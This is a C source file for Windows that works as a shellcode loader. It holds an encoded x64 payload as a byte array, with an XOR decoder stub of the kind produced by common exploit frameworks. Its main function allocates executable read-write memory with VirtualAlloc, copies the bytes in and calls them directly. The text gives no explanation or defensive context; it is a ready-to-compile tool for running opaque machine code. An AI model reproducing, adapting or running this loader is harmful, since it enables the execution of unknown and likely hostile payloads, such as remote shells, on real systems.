#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <Windows.h>
unsigned char shellcode[] =
"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\x1c\xbb\x56\xa9\x17\xb2\xff\x9f\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe0\xf3\xd5\x4d\xe7\x5a"
"\x3f\x9f\x1c\xbb\x17\xf8\x56\xe2\xad\xce\x4a\xf3\x67\x7b\x72"
"\xfa\x74\xcd\x7c\xf3\xdd\xfb\x0f\xfa\x74\xcd\x3c\xf3\xdd\xdb"
"\x47\xfa\xf0\x28\x56\xf1\x1b\x98\xde\xfa\xce\x5f\xb0\x87\x37"
"\xd5\x15\x9e\xdf\xde\xdd\x72\x5b\xe8\x16\x73\x1d\x72\x4e\xfa"
"\x07\xe1\x9c\xe0\xdf\x14\x5e\x87\x1e\xa8\xc7\x39\x7f\x17\x1c"
"\xbb\x56\xe1\x92\x72\x8b\xf8\x54\xba\x86\xf9\x9c\xfa\xe7\xdb"
"\x97\xfb\x76\xe0\x16\x62\x1c\xc9\x54\x44\x9f\xe8\x9c\x86\x77"
"\xd7\x1d\x6d\x1b\x98\xde\xfa\xce\x5f\xb0\xfa\x97\x60\x1a\xf3"
"\xfe\x5e\x24\x5b\x23\x58\x5b\xb1\xb3\xbb\x14\xfe\x6f\x78\x62"
"\x6a\xa7\xdb\x97\xfb\x72\xe0\x16\x62\x99\xde\x97\xb7\x1e\xed"
"\x9c\xf2\xe3\xd6\x1d\x6b\x17\x22\x13\x3a\xb7\x9e\xcc\xfa\x0e"
"\xe8\x4f\xec\xa6\xc5\x5d\xe3\x17\xf0\x56\xe8\xb7\x1c\xf0\x9b"
"\x17\xfb\xe8\x52\xa7\xde\x45\xe1\x1e\x22\x05\x5b\xa8\x60\xe3"
"\x44\x0b\xe1\xad\xb3\xff\x9f\x1c\xbb\x56\xa9\x17\xfa\x72\x12"
"\x1d\xba\x56\xa9\x56\x08\xce\x14\x73\x3c\xa9\x7c\xac\x42\x4a"
"\x3d\x4a\xfa\xec\x0f\x82\x0f\x62\x60\xc9\xf3\xd5\x6d\x3f\x8e"
"\xf9\xe3\x16\x3b\xad\x49\x62\xb7\x44\xd8\x0f\xc9\x39\xc3\x17"
"\xeb\xbe\x16\xc6\x44\x83\xca\x76\xde\x9c\xb1\x79\xc3\x33\xa9"
"\x17\xb2\xff\x9f";
int main()
{
	void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	//RtlMoveMemory(exec, shellcode, strlen(shellcode));
	//rv = VirtualProtect(exec, strlen(shellcode), PAGE_EXECUTE_READ, &oldprotect);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)();
	//	if ( rv != 0 ) {
	//			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec, 0, 0, 0);
	//			WaitForSingleObject(th, -1);
	//	}

	return 0;
}